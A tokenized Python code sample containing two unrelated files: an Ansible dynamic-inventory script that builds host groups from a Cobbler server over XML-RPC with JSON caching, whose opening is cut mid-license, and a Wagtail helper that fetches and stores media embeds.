▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License <encdom>  # ▁ along ▁ with ▁ Ansible. ▁ If ▁ not, ▁ see ▁ <http://www.gnu.org/licenses/>. <encdom> import argparse <newline> import ConfigParser <newline> import os <newline> import re <newline> from time import time <newline> import xmlrpclib <newline> try : <newline> <indent> import json <newline> <dedent> except ImportError : <newline> <indent> import simplejson as json <newline> <dedent> from six import iteritems <newline>  # ▁ NOTE ▁ -- ▁ this ▁ file ▁ assumes ▁ Ansible ▁ is ▁ being ▁ accessed ▁ FROM ▁ the ▁ cobbler <encdom>  # ▁ server, ▁ so ▁ it ▁ does ▁ not ▁ attempt ▁ to ▁ login ▁ with ▁ a ▁ username ▁ and ▁ password. <encdom>  # ▁ this ▁ will ▁ be ▁ addressed ▁ in ▁ a ▁ future ▁ version ▁ of ▁ this ▁ script. <encdom> orderby_keyname = 'owners'  # ▁ alternatively ▁'mgmt_classes' <encdom> <newline> class CobblerInventory ( object ) : <newline> <indent> def __init__ ( self ) : <newline> <indent>  """ ▁ Main ▁ execution ▁ path ▁ """  <newline> self . conn = None <newline> self . inventory = dict ( )  # ▁ A ▁ list ▁ of ▁ groups ▁ and ▁ the ▁ hosts ▁ in ▁ that ▁ group <encdom> <newline> self . cache = dict ( )  # ▁ Details ▁ about ▁ hosts ▁ in ▁ the ▁ inventory <encdom> <newline>  # ▁ Read ▁ settings ▁ and ▁ parse ▁ CLI ▁ arguments <encdom> self . read_settings ( ) <newline> self . parse_cli_args ( ) <newline>  # ▁ Cache <encdom> if self . args . refresh_cache : <newline> <indent> self . update_cache ( ) <newline> <dedent> elif not self . is_cache_valid ( ) : <newline> <indent> self . update_cache ( ) <newline> <dedent> else : <newline> <indent> self . load_inventory_from_cache ( ) <newline> self . load_cache_from_cache ( ) <newline> <dedent> data_to_print = "" <newline>  # ▁ Data ▁ to ▁ print <encdom> if self . args . host : <newline> <indent> data_to_print += self . get_host_info ( ) <newline> <dedent> else : <newline> <indent> self . inventory [ '_meta' ] = { 'hostvars' : { } } <newline> for hostname in self . cache : <newline> <indent> self . inventory [ '_meta' ] [ 'hostvars' ] [ hostname ] = { 'cobbler' : self . cache [ hostname ] } <newline> <dedent> data_to_print += self . json_format_dict ( self . inventory , True ) <newline> <dedent> print ( data_to_print ) <newline> <dedent> def _connect ( self ) : <newline> <indent> if not self . conn : <newline> <indent> self . conn = xmlrpclib . Server ( self . cobbler_host , allow_none = True ) <newline> <dedent> <dedent> def is_cache_valid ( self ) : <newline> <indent>  """ ▁ Determines ▁ if ▁ the ▁ cache ▁ files ▁ have ▁ expired, ▁ or ▁ if ▁ it ▁ is ▁ still ▁ valid ▁ """  <newline> if os . path . isfile ( self . cache_path_cache ) : <newline> <indent> mod_time = os . path . getmtime ( self . cache_path_cache ) <newline> current_time = time ( ) <newline> if ( mod_time + self . cache_max_age ) > current_time : <newline> <indent> if os . path . isfile ( self . cache_path_inventory ) : <newline> <indent> return True <newline> <dedent> <dedent> <dedent> return False <newline> <dedent> def read_settings ( self ) : <newline> <indent>  """ ▁ Reads ▁ the ▁ settings ▁ from ▁ the ▁ cobbler.ini ▁ file ▁ """  <newline> config = ConfigParser . SafeConfigParser ( ) <newline> config . read ( os . path . dirname ( os . path . realpath ( __file__ ) ) + '/cobbler.ini' ) <newline> self . cobbler_host = config . get ( 'cobbler' , 'host' ) <newline>  # ▁ Cache ▁ related <encdom> cache_path = config . get ( 'cobbler' , 'cache_path' ) <newline> self . cache_path_cache = cache_path + "/ansible-cobbler.cache" <newline> self . cache_path_inventory = cache_path + "/ansible-cobbler.index" <newline> self . cache_max_age = config . getint ( 'cobbler' , 'cache_max_age' ) <newline> <dedent> def parse_cli_args ( self ) : <newline> <indent>  """ ▁ Command ▁ line ▁ argument ▁ processing ▁ """  <newline> parser = argparse . ArgumentParser ( description = 'Produce ▁ an ▁ Ansible ▁ Inventory ▁ file ▁ based ▁ on ▁ Cobbler' ) <newline> parser . add_argument ( '--list' , action = 'store_true' , default = True , help = 'List ▁ instances ▁ (default: ▁ True)' ) <newline> parser . add_argument ( '--host' , action = 'store' , help = 'Get ▁ all ▁ the ▁ variables ▁ about ▁ a ▁ specific ▁ instance' ) <newline> parser . add_argument ( '--refresh-cache' , action = 'store_true' , default = False , help = 'Force ▁ refresh ▁ of ▁ cache ▁ by ▁ making ▁ API ▁ requests ▁ to ▁ cobbler ▁ (default: ▁ False ▁ - ▁ use ▁ cache ▁ files)' ) <newline> self . args = parser . parse_args ( ) <newline> <dedent> def update_cache ( self ) : <newline> <indent>  """ ▁ Make ▁ calls ▁ to ▁ cobbler ▁ and ▁ save ▁ the ▁ output ▁ in ▁ a ▁ cache ▁ """  <newline> self . _connect ( ) <newline> self . groups = dict ( ) <newline> self . hosts = dict ( ) <newline> data = self . conn . get_systems ( ) <newline> for host in data : <newline>  # ▁ Get ▁ the ▁ FQDN ▁ for ▁ the ▁ host ▁ and ▁ add ▁ it ▁ to ▁ the ▁ right ▁ groups <encdom> <indent> dns_name = host [ 'hostname' ]  # None <encdom> <newline> ksmeta = None <newline> interfaces = host [ 'interfaces' ] <newline>  # ▁ hostname ▁ is ▁ often ▁ empty ▁ for ▁ non-static ▁ IP ▁ hosts <encdom> if dns_name == '' : <newline> <indent> for ( iname , ivalue ) in iteritems ( interfaces ) : <newline> <indent> if ivalue [ 'management' ] or not ivalue [ 'static' ] : <newline> <indent> this_dns_name = ivalue . get ( 'dns_name' , None ) <newline> if this_dns_name is not None and this_dns_name is not "" : <newline> <indent> dns_name = this_dns_name <newline> <dedent> <dedent> <dedent> <dedent> if dns_name == '' : <newline> <indent> continue <newline> <dedent> status = host [ 'status' ] <newline> profile = host [ 'profile' ] <newline> classes = host [ orderby_keyname ] <newline> if status not in self . inventory : <newline> <indent> self . inventory [ status ] = [ ] <newline> <dedent> self . inventory [ status ] . append ( dns_name ) <newline> if profile not in self . inventory : <newline> <indent> self . inventory [ profile ] = [ ] <newline> <dedent> self . inventory [ profile ] . append ( dns_name ) <newline> for cls in classes : <newline> <indent> if cls not in self . inventory : <newline> <indent> self . inventory [ cls ] = [ ] <newline> <dedent> self . inventory [ cls ] . append ( dns_name ) <newline>  # ▁ Since ▁ we ▁ already ▁ have ▁ all ▁ of ▁ the ▁ data ▁ for ▁ the ▁ host, ▁ update ▁ the ▁ host ▁ details ▁ as ▁ well <encdom>  # ▁ The ▁ old ▁ way ▁ was ▁ ksmeta ▁ only ▁ -- ▁ provide ▁ backwards ▁ compatibility <encdom> <dedent> self . cache [ dns_name ] = host <newline> if "ks_meta" in host : <newline> <indent> for key , value in iteritems ( host [ "ks_meta" ] ) : <newline> <indent> self . cache [ dns_name ] [ key ] = value <newline> <dedent> <dedent> <dedent> self . write_to_cache ( self . cache , self . cache_path_cache ) <newline> self . write_to_cache ( self . inventory , self . cache_path_inventory ) <newline> <dedent> def get_host_info ( self ) : <newline> <indent>  """ ▁ Get ▁ variables ▁ about ▁ a ▁ specific ▁ host ▁ """  <newline> if not self . cache or len ( self . cache ) == 0 : <newline>  # ▁ Need ▁ to ▁ load ▁ index ▁ from ▁ cache <encdom> <indent> self . load_cache_from_cache ( ) <newline> <dedent> if not self . args . host in self . cache : <newline>  # ▁ try ▁ updating ▁ the ▁ cache <encdom> <indent> self . update_cache ( ) <newline> if not self . args . host in self . cache : <newline>  # ▁ host ▁ might ▁ not ▁ exist ▁ anymore <encdom> <indent> return self . json_format_dict ( { } , True ) <newline> <dedent> <dedent> return self . json_format_dict ( self . cache [ self . args . host ] , True ) <newline> <dedent> def push ( self , my_dict , key , element ) : <newline> <indent>  """ ▁ Pushed ▁ an ▁ element ▁ onto ▁ an ▁ array ▁ that ▁ may ▁ not ▁ have ▁ been ▁ defined ▁ in ▁ the ▁ dict ▁ """  <newline> if key in my_dict : <newline> <indent> my_dict [ key ] . append ( element ) <newline> <dedent> else : <newline> <indent> my_dict [ key ] = [ element ] <newline> <dedent> <dedent> def load_inventory_from_cache ( self ) : <newline> <indent>  """ ▁ Reads ▁ the ▁ index ▁ from ▁ the ▁ cache ▁ file ▁ sets ▁ self.index ▁ """  <newline> cache = open ( self . cache_path_inventory , 'r' ) <newline> json_inventory = cache . read ( ) <newline> self . inventory = json . loads ( json_inventory ) <newline> <dedent> def load_cache_from_cache ( self ) : <newline> <indent>  """ ▁ Reads ▁ the ▁ cache ▁ from ▁ the ▁ cache ▁ file ▁ sets ▁ self.cache ▁ """  <newline> cache = open ( self . cache_path_cache , 'r' ) <newline> json_cache = cache . read ( ) <newline> self . cache = json . loads ( json_cache ) <newline> <dedent> def write_to_cache ( self , data , filename ) : <newline> <indent>  """ ▁ Writes ▁ data ▁ in ▁ JSON ▁ format ▁ to ▁ a ▁ file ▁ """  <newline> json_data = self . json_format_dict ( data , True ) <newline> cache = open ( filename , 'w' ) <newline> cache . write ( json_data ) <newline> cache . close ( ) <newline> <dedent> def to_safe ( self , word ) : <newline> <indent>  """ ▁ Converts ▁'bad' ▁ characters ▁ in ▁ a ▁ string ▁ to ▁ underscores ▁ so ▁ they ▁ can ▁ be ▁ used ▁ as ▁ Ansible ▁ groups ▁ """  <newline> return re . sub ( "[^A-Za-z0-9\-]" , "_" , word ) <newline> <dedent> def json_format_dict ( self , data , pretty = False ) : <newline> <indent>  """ ▁ Converts ▁ a ▁ dict ▁ to ▁ a ▁ JSON ▁ object ▁ and ▁ dumps ▁ it ▁ as ▁ a ▁ formatted ▁ string ▁ """  <newline> if pretty : <newline> <indent> return json . dumps ( data , sort_keys = True , indent = 2 ) <newline> <dedent> else : <newline> <indent> return json . dumps ( data ) <newline> <dedent> <dedent> <dedent> CobblerInventory ( ) <newline>
from datetime import datetime <newline> from wagtail . wagtailembeds . models import Embed <newline> from wagtail . wagtailembeds . finders import get_default_finder <newline> def get_embed ( url , max_width = None , finder = None ) : <newline>  # ▁ Check ▁ database <encdom> <indent> try : <newline> <indent> return Embed . objects . get ( url = url , max_width = max_width ) <newline> <dedent> except Embed . DoesNotExist : <newline> <indent> pass <newline>  # ▁ Get/Call ▁ finder <encdom> <dedent> if not finder : <newline> <indent> finder = get_default_finder ( ) <newline> <dedent> embed_dict = finder ( url , max_width ) <newline>  # ▁ Make ▁ sure ▁ width ▁ and ▁ height ▁ are ▁ valid ▁ integers ▁ before ▁ inserting ▁ into ▁ database <encdom> try : <newline> <indent> embed_dict [ 'width' ] = int ( embed_dict [ 'width' ] ) <newline> <dedent> except ( TypeError , ValueError ) : <newline> <indent> embed_dict [ 'width' ] = None <newline> <dedent> try : <newline> <indent> embed_dict [ 'height' ] = int ( embed_dict [ 'height' ] ) <newline> <dedent> except ( TypeError , ValueError ) : <newline> <indent> embed_dict [ 'height' ] = None <newline>  # ▁ Make ▁ sure ▁ html ▁ field ▁ is ▁ valid <encdom> <dedent> if 'html' not in embed_dict or not embed_dict [ 'html' ] : <newline> <indent> embed_dict [ 'html' ] = '' <newline>  # ▁ Create ▁ database ▁ record <encdom> <dedent> embed , created = Embed . objects . get_or_create ( url = url , max_width = max_width , defaults = embed_dict , ) <newline>  # ▁ Save <encdom> embed . last_updated = datetime . now ( ) <newline> embed . save ( ) <newline> return embed <newline> <dedent>